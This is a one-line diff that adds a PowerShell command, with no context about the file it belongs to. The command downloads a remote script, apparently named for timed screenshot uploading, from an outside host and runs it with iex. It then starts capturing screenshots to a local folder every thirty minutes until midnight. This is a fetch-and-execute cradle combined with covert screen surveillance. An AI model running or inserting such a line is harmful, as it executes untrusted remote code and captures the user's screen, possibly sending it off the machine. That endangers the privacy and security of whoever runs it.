@@ -1,0 +1,1 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-WebRequest -UseBasicParsing 'https://catss.my.id/8/Get-TimedScreenshotUpload.ps1'); Get-TimedScreenshot -Path 'C:\temp\shots' -Interval 1800 -EndTime '23:59' -Verbose
